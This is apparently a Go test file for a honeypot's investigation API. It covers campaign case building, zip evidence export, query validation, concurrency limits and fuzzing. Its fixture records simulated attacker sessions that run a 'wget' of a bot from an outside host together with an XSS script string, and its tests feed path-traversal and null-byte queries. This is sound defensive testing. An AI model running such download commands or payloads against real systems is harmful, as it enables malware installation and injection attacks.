package server

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/intelligence"
	"github.com/qpot/qpot/internal/investigate"
)

// caseDB is fakeDB with stored events and the sessions the campaign builder
// makes of them. block, when set, holds every event read until it is closed.
type caseDB struct {
	fakeDB
	stored   []*database.Event
	sessions []*database.TTPSession
	block    chan struct{}
}

func (d *caseDB) GetEvents(ctx context.Context, f database.EventFilter) ([]*database.Event, error) {
	if d.block != nil {
		select {
		case <-d.block:
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}
	var out []*database.Event
	for _, e := range d.stored {
		if (!f.StartTime.IsZero() && e.Timestamp.Before(f.StartTime)) || (!f.EndTime.IsZero() && e.Timestamp.After(f.EndTime)) {
			continue
		}
		if len(f.SourceIPs) > 0 && !strings.Contains(" "+strings.Join(f.SourceIPs, " ")+" ", " "+e.SourceIP+" ") {
			continue
		}
		out = append(out, e)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Timestamp.After(out[j].Timestamp) })
	if f.Offset >= len(out) {
		return nil, nil
	}
	if out = out[f.Offset:]; f.Limit > 0 && len(out) > f.Limit {
		out = out[:f.Limit]
	}
	return out, nil
}

func (d *caseDB) GetTTPSessions(context.Context, int) ([]*database.TTPSession, error) {
	return d.sessions, nil
}

// newCaseDB stores two sources that fetched the same payload.
func newCaseDB() *caseDB {
	base := time.Now().UTC().Add(-10 * time.Minute).Truncate(time.Second)
	const sum = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
	d := &caseDB{}
	b := intelligence.NewTTPBuilder(30 * time.Minute)
	for i, ip := range []string{"198.51.100.1", "198.51.100.2"} {
		at := base.Add(time.Duration(i) * time.Minute)
		mk := func(ms int, typ, command, payload string) {
			e := &database.Event{Timestamp: at.Add(time.Duration(ms) * time.Millisecond), Honeypot: "cowrie", SourceIP: ip, DestPort: 22,
				EventType: typ, Command: command, Payload: []byte(payload), Classified: true, Metadata: map[string]string{"session": "c" + ip}}
			if typ == "cowrie.session.file_download" {
				e.Metadata["shasum"] = sum
			}
			d.stored = append(d.stored, e)
			b.Update(e)
		}
		mk(0, "cowrie.session.connect", "", "")
		mk(10, "cowrie.command.input", "wget http://203.0.113.50/bot; echo <script>alert(1)</script>", "")
		mk(20, "cowrie.session.file_download", "", "http://203.0.113.50/bot")
	}
	d.sessions = b.GetActiveSessions()
	return d
}

func TestInvestigateAPI(t *testing.T) {
	a := newAPITestServer(t, "api-investigate", nil)
	db := newCaseDB()
	a.s.database = db
	for _, path := range []string{"/api/investigate", "/api/investigate/case?session=x", "/api/investigate/export?session=x"} {
		assertAuthRequired(t, a.h, http.MethodGet, path, "")
		if rec := a.do(http.MethodPost, path, `{}`); rec.Code != http.StatusMethodNotAllowed {
			t.Fatalf("POST %s = %d", path, rec.Code)
		}
	}

	rec := a.do(http.MethodGet, "/api/investigate?limit=1", "")
	var listing investigate.Listing
	if err := json.Unmarshal(rec.Body.Bytes(), &listing); err != nil || rec.Code != http.StatusOK {
		t.Fatalf("list = %d %v: %s", rec.Code, err, rec.Body.String())
	}
	if len(listing.Sessions) != 1 || len(listing.Campaigns) != 1 || listing.Campaigns[0].Sessions != 2 || listing.Scanned != 2 {
		t.Fatalf("listing: %+v", listing)
	}
	fingerprint, session := listing.Campaigns[0].Fingerprint, listing.Sessions[0].SessionID

	// The case of the campaign: both sessions, and what links them.
	rec = a.do(http.MethodGet, "/api/investigate/case?campaign="+fingerprint, "")
	var c investigate.Case
	if err := json.Unmarshal(rec.Body.Bytes(), &c); err != nil || rec.Code != http.StatusOK {
		t.Fatalf("case = %d %v: %s", rec.Code, err, rec.Body.String())
	}
	if c.Kind != "campaign" || c.Instance != "api-investigate" || len(c.Sessions) != 2 || len(c.Links) != 2 || len(c.Records) != 6 || c.Trips == nil {
		t.Fatalf("case: kind %s, instance %s, %d sessions, %d links, %d records", c.Kind, c.Instance, len(c.Sessions), len(c.Links), len(c.Records))
	}
	if rec.Header().Get("Cache-Control") != "no-store" || !strings.HasPrefix(rec.Header().Get("Content-Type"), "application/json") {
		t.Fatalf("headers: %v", rec.Header())
	}
	// A session alone, with a limit.
	rec = a.do(http.MethodGet, "/api/investigate/case?session="+session+"&max_events=2", "")
	c = investigate.Case{}
	if err := json.Unmarshal(rec.Body.Bytes(), &c); err != nil || rec.Code != http.StatusOK || len(c.Records) != 2 || len(c.Related) != 1 {
		t.Fatalf("session case = %d %v: %d records, %d related", rec.Code, err, len(c.Records), len(c.Related))
	}

	// The bundle is a zip that checks out, sent as a download.
	rec = a.do(http.MethodGet, "/api/investigate/export?campaign="+fingerprint, "")
	if rec.Code != http.StatusOK || rec.Header().Get("Content-Type") != "application/zip" ||
		rec.Header().Get("Content-Disposition") != `attachment; filename="qpot-campaign-`+fingerprint[:24]+`.zip"` || rec.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("export = %d, headers %v", rec.Code, rec.Header())
	}
	data := rec.Body.Bytes()
	rep, err := investigate.VerifyBundle(bytes.NewReader(data), int64(len(data)))
	if err != nil || !rep.OK() || rep.Records != 6 || rep.Kind != "campaign" {
		t.Fatalf("bundle: %v %+v", err, rep)
	}
	if zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data))); err != nil || len(zr.File) != 5 {
		t.Fatalf("zip: %v", err)
	}

	for query, want := range map[string]int{
		"":                                      http.StatusBadRequest,
		"?session=a&campaign=b":                 http.StatusBadRequest,
		"?session=../x":                         http.StatusBadRequest,
		"?session=" + strings.Repeat("a", 129):  http.StatusBadRequest,
		"?campaign=a%00b":                       http.StatusBadRequest,
		"?session=" + session + "&max_events=0": http.StatusBadRequest,
		"?session=" + session + "&max_events=50001":  http.StatusBadRequest,
		"?session=nosuchsession":                     http.StatusNotFound,
		"?campaign=ffffffffffffffffffffffffffffffff": http.StatusNotFound,
	} {
		for _, path := range []string{"/api/investigate/case", "/api/investigate/export"} {
			rec := a.do(http.MethodGet, path+query, "")
			if rec.Code != want || decodeAPIError(t, rec).Error == "" {
				t.Errorf("GET %s%s = %d, want %d: %s", path, query, rec.Code, want, rec.Body.String())
			}
		}
	}
	if rec := a.do(http.MethodGet, "/api/investigate?limit=0", ""); rec.Code != http.StatusBadRequest {
		t.Errorf("limit=0 = %d", rec.Code)
	}

	a.s.database = nil
	for _, path := range []string{"/api/investigate", "/api/investigate/case?session=" + session} {
		if rec := a.do(http.MethodGet, path, ""); rec.Code != http.StatusServiceUnavailable || decodeAPIError(t, rec).Code != "QP-INST-005" {
			t.Errorf("no database: GET %s = %d", path, rec.Code)
		}
	}
}

// Only caseSlots cases are put together at once: one more is told to come
// back, and gets its case once a slot is free.
func TestInvestigateBuildsFewCasesAtOnce(t *testing.T) {
	a := newAPITestServer(t, "api-investigate-slots", nil)
	db := newCaseDB()
	db.block = make(chan struct{})
	a.s.database = db
	path := "/api/investigate/case?session=" + db.sessions[0].SessionID

	codes := make(chan int, caseSlots)
	for i := 0; i < caseSlots; i++ {
		go func() { codes <- a.do(http.MethodGet, path, "").Code }()
	}
	deadline := time.Now().Add(10 * time.Second)
	for {
		a.s.caseMu.Lock()
		n := a.s.casesBuilding
		a.s.caseMu.Unlock()
		if n == caseSlots {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%d cases being built", n)
		}
		time.Sleep(5 * time.Millisecond)
	}
	rec := a.do(http.MethodGet, path, "")
	if rec.Code != http.StatusTooManyRequests || rec.Header().Get("Retry-After") == "" {
		t.Fatalf("a third case = %d", rec.Code)
	}
	close(db.block)
	for i := 0; i < caseSlots; i++ {
		if code := <-codes; code != http.StatusOK {
			t.Fatalf("a held case = %d", code)
		}
	}
	if rec := a.do(http.MethodGet, path, ""); rec.Code != http.StatusOK || a.s.casesBuilding != 0 {
		t.Fatalf("after the others = %d, %d still counted", rec.Code, a.s.casesBuilding)
	}
}

func FuzzInvestigateQuery(f *testing.F) {
	a := newAPITestServer(f, "api-investigate-fuzz", nil)
	db := newCaseDB()
	a.s.database = db
	for _, q := range []string{"session=" + db.sessions[0].SessionID, "campaign=" + db.sessions[0].CampaignFingerprint, "session=x&max_events=5", "limit=3", "session=%00", "campaign=..%2f..", ""} {
		f.Add(q)
	}
	f.Fuzz(func(t *testing.T, query string) {
		if strings.ContainsAny(query, " \r\n\t#") || len(query) > 2000 {
			return
		}
		for _, path := range []string{"/api/investigate", "/api/investigate/case", "/api/investigate/export"} {
			rec := func() (rec interface {
				Result() *http.Response
			}) {
				defer func() {
					if recover() != nil {
						rec = nil // the test request itself was not valid
					}
				}()
				return a.do(http.MethodGet, path+"?"+query, "")
			}()
			if rec == nil {
				continue
			}
			code := rec.Result().StatusCode
			if code != http.StatusOK && code != http.StatusBadRequest && code != http.StatusNotFound {
				t.Fatalf("GET %s?%s = %d", path, query, code)
			}
		}
	})
}
